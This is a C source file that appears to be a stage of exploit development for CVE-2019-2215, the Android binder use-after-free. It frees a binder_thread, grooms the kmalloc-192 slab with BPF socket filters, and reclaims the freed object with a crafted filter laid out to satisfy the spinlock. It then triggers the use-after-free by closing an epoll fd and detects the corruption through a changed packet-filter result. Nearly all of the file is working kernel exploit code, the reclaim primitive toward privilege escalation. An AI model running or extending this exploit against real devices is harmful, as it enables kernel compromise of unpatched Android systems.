/*
 * bpf_reclaim_v3.c — Definitive CVE-2019-2215 reclaim + detection
 *
 * BREAKTHROUGH INSIGHT: The previous tests used BPF_JMP instructions at
 * the spinlock position (offset 44). Internal code BPF_S_JMP_JEQ_K = 38,
 * which gives owner=38, next=<jt|jf<<8>. Since owner != next, the ticket
 * spinlock HANGS, which is detectable but creates a timeout.
 *
 * The problem: we never SAW a hang. This means BPF is NOT reclaiming.
 *
 * OR... it IS reclaiming but the spinlock doesn't hang because the internal
 * code happens to match the ticket values. Let's GUARANTEE the spinlock
 * succeeds by using BPF_RET|BPF_K at insns[3]:
 *   - Internal code: BPF_S_RET_K = 1
 *   - Set jt=1, jf=0
 *   - u32 at offset 44: owner=1, next=1 → UNLOCKED
 *   - spin_lock succeeds → list_del runs → corrupts insns[3].k with heap addr
 *   - spin_unlock increments owner → code becomes BPF_S_RET_A = 2
 *   - Filter now returns A (accumulator) instead of k
 *   - Pre-load A with non-zero value → packet ACCEPTED after corruption
 *   - Before corruption: RET k=0 → DROP
 *
 * Detection: send packet, try recv(). Success = corruption = UAF confirmed!
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  0x40046208
#define BINDER_SET_MAX_THREADS 0x40046205

static int do_test(int attempt, int use_groom, int groom_count) {
    /* All on CPU 0 */
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    /* === UDP socket pair for packet testing === */
    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int sender = socket(AF_INET, SOCK_DGRAM, 0);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(0x7F000001);
    addr.sin_port = htons(31337 + (attempt & 0xFF));
    bind(udp_sock, (struct sockaddr*)&addr, sizeof(addr));
    
    struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 }; /* 100ms timeout */
    setsockopt(udp_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    /* === Optional slab grooming ===
     * Fill k192 with BPF allocations, then drain some to create holes.
     * binder_thread fills a hole, gets freed, then reclaim BPF fills it again. */
    int *groom_fds = NULL;
    if (use_groom && groom_count > 0) {
        groom_fds = calloc(groom_count, sizeof(int));
        struct sock_filter g_insns[20];
        memset(g_insns, 0, sizeof(g_insns));
        g_insns[19].code = 0x06; /* RET */
        g_insns[19].k = 0xFFFF;
        struct sock_fprog g_prog = { .len = 20, .filter = g_insns };
        
        for (int i = 0; i < groom_count; i++) {
            groom_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (groom_fds[i] >= 0)
                setsockopt(groom_fds[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &g_prog, sizeof(g_prog));
        }
        /* Drain last few to create LIFO holes */
        for (int i = groom_count - 6; i < groom_count; i++) {
            if (groom_fds[i] >= 0) {
                close(groom_fds[i]);
                groom_fds[i] = -1;
            }
        }
    }
    
    /* === Create binder_thread (goes to k192) === */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) return -1;
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    
    /* === Free binder_thread (kfree → per-CPU freelist) === */
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);
    
    /* === Reclaim with BPF filter ===
     * 20 instructions → header(12-20) + 160 = 172-180 → kmalloc-192
     *
     * KEY: insns[3] at offset 44 (if header=20) or insns[4] at offset 44 (if header=12)
     * We make BOTH insns[3] AND insns[4] have the magic spinlock-unlock pattern:
     *   code=BPF_RET|BPF_K(0x06), jt=1, jf=0, k=0
     *   After internal conversion: code=BPF_S_RET_K=1
     *   u32: 0x00010001 → ticket lock owner=1, next=1 → UNLOCKED
     *
     * insns[0-2]: LD_IMM k=42 → loads A=42 (non-zero accumulator)
     * After spin_unlock: code becomes BPF_S_RET_A=2 → returns A=42 → ACCEPT
     * Before corruption: code is BPF_S_RET_K → returns k=0 → DROP
     */
    struct sock_filter det_insns[20];
    memset(det_insns, 0, sizeof(det_insns));
    
    /* insns[0-2]: LD_IMM with k=42 (loads accumulator with 42) */
    for (int j = 0; j < 3; j++) {
        det_insns[j].code = 0x00; /* BPF_LD|BPF_IMM */
        det_insns[j].k = 42;
    }
    
    /* insns[3]: RET_K k=0 → DROP normally. Spinlock-compatible! */
    det_insns[3].code = 0x06; /* BPF_RET|BPF_K → internal BPF_S_RET_K=1 */
    det_insns[3].jt = 1;     /* next ticket low byte = 1 */
    det_insns[3].jf = 0;     /* next ticket high byte = 0 */
    det_insns[3].k = 0;      /* Return 0 = DROP */
    
    /* insns[4]: Same pattern (covers header=12 case where insns[4] is at offset 44) */
    det_insns[4].code = 0x06;
    det_insns[4].jt = 1;
    det_insns[4].jf = 0;
    det_insns[4].k = 0;
    
    /* insns[5-18]: padding (RET 0 = DROP) */
    for (int j = 5; j < 19; j++) {
        det_insns[j].code = 0x06;
        det_insns[j].k = 0;
    }
    
    /* insns[19]: RET 0xFFFF = ACCEPT (safety, never reached normally) */
    det_insns[19].code = 0x06;
    det_insns[19].k = 0xFFFF;
    
    struct sock_fprog det_prog = { .len = 20, .filter = det_insns };
    int sso_ret = setsockopt(udp_sock, SOL_SOCKET, SO_ATTACH_FILTER,
                            &det_prog, sizeof(det_prog));
    if (sso_ret < 0) {
        close(epfd); close(bfd); close(udp_sock); close(sender);
        if (groom_fds) { for(int i=0;i<groom_count;i++) if(groom_fds[i]>=0) close(groom_fds[i]); free(groom_fds); }
        return -2;
    }
    
    /* === Verify: packet should be DROPPED before UAF === */
    char pre_msg[] = "PRETEST";
    sendto(sender, pre_msg, sizeof(pre_msg), 0, (struct sockaddr*)&addr, sizeof(addr));
    char buf[64];
    ssize_t pre_got = recv(udp_sock, buf, sizeof(buf), 0);
    if (pre_got > 0) {
        /* Filter isn't dropping packets — something wrong */
        close(epfd); close(bfd); close(udp_sock); close(sender);
        if (groom_fds) { for(int i=0;i<groom_count;i++) if(groom_fds[i]>=0) close(groom_fds[i]); free(groom_fds); }
        return -3; /* filter not working */
    }
    
    /* === UAF TRIGGER: close(epfd) ===
     * ep_free → ep_unregister_pollwait → ep_remove_wait_queue →
     * spin_lock_irqsave on freed (and hopefully reclaimed) memory at offset 44.
     *
     * If BPF reclaimed:
     *   - spin_lock sees owner=1, next=1 → succeeds
     *   - list_del writes heap addr to offsets 48 and 52
     *   - spin_unlock: owner++ → code goes from 1 (RET_K) to 2 (RET_A)
     *   - Filter now returns A=42 → ACCEPT
     *
     * If NOT reclaimed:
     *   - spin_lock sees 0 (freed memory) → succeeds trivially
     *   - list_del writes to freed (but not BPF) memory → no effect
     *   - Filter unchanged → still DROP
     */
    close(epfd);
    
    /* === Detection: send packet, check if filter behavior changed === */
    char test_msg[] = "UAFTEST!";
    sendto(sender, test_msg, sizeof(test_msg), 0, (struct sockaddr*)&addr, sizeof(addr));
    
    ssize_t got = recv(udp_sock, buf, sizeof(buf), 0);
    
    int result = (got > 0) ? 1 : 0; /* 1 = corrupted (UAF!), 0 = not corrupted */
    
    /* Cleanup */
    close(udp_sock);
    close(sender);
    close(bfd);
    if (groom_fds) {
        for (int i = 0; i < groom_count; i++)
            if (groom_fds[i] >= 0) close(groom_fds[i]);
        free(groom_fds);
    }
    
    return result;
}

int main() {
    printf("=== CVE-2019-2215 BPF Reclaim v3 (spinlock-compatible) ===\n");
    printf("BPF_S_RET_K=1 at insns[3]: owner=1,next=1 → lock succeeds\n");
    printf("After corruption: code→RET_A, returns A=42 → packet accepted\n\n");
    
    /* TEST A: No grooming, 500 attempts */
    printf("--- TEST A: No grooming, 500 attempts ---\n");
    int detected = 0, errors = 0, filter_bad = 0;
    for (int i = 0; i < 500; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            int r = do_test(i, 0, 0);
            _exit(r < 0 ? 200 + (-r) : r);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            int code = WEXITSTATUS(status);
            if (code == 1) {
                detected++;
                if (detected <= 5) printf("  [%d] DETECTED! BPF corrupted by UAF!\n", i);
            } else if (code == 203) {
                filter_bad++;
            } else if (code >= 200) {
                errors++;
            }
        } else if (WIFSIGNALED(status)) {
            if (WTERMSIG(status) == 14) {
                /* SIGALRM = hang */
                if (detected + errors < 5) printf("  [%d] HANG (spinlock stuck)\n", i);
                errors++;
            }
        }
        if (i == 99 || i == 249 || i == 499)
            printf("  [%d/%d] detected=%d errors=%d filter_bad=%d\n",
                   i+1, 500, detected, errors, filter_bad);
    }
    printf("  Result: %d/500 detected, %d errors, %d filter_bad\n\n",
           detected, errors, filter_bad);
    
    /* TEST B: With grooming (200 fill, 6 drain) */
    printf("--- TEST B: Groomed, 500 attempts ---\n");
    detected = 0; errors = 0; filter_bad = 0;
    for (int i = 0; i < 500; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            int r = do_test(i, 1, 200);
            _exit(r < 0 ? 200 + (-r) : r);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            int code = WEXITSTATUS(status);
            if (code == 1) {
                detected++;
                if (detected <= 5) printf("  [%d] DETECTED! BPF corrupted by UAF!\n", i);
            } else if (code == 203) {
                filter_bad++;
            } else if (code >= 200) {
                errors++;
            }
        } else if (WIFSIGNALED(status)) {
            if (WTERMSIG(status) == 14) {
                errors++;
            }
        }
        if (i == 99 || i == 249 || i == 499)
            printf("  [%d/%d] detected=%d errors=%d filter_bad=%d\n",
                   i+1, 500, detected, errors, filter_bad);
    }
    printf("  Result: %d/500 detected, %d errors, %d filter_bad\n\n",
           detected, errors, filter_bad);

    /* TEST C: Heavy grooming (1000 fill) */
    printf("--- TEST C: Heavy groom (1000 fill), 200 attempts ---\n");
    detected = 0; errors = 0; filter_bad = 0;
    for (int i = 0; i < 200; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int r = do_test(i, 1, 1000);
            _exit(r < 0 ? 200 + (-r) : r);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            int code = WEXITSTATUS(status);
            if (code == 1) {
                detected++;
                if (detected <= 5) printf("  [%d] DETECTED!\n", i);
            } else if (code == 203) {
                filter_bad++;
            } else if (code >= 200) {
                errors++;
            }
        } else if (WIFSIGNALED(status)) {
            errors++;
        }
        if (i == 99 || i == 199)
            printf("  [%d/%d] detected=%d errors=%d\n", i+1, 200, detected, errors);
    }
    printf("  Result: %d/200 detected, %d errors\n", detected, errors);

    printf("\n=== Done ===\n");
    return 0;
}
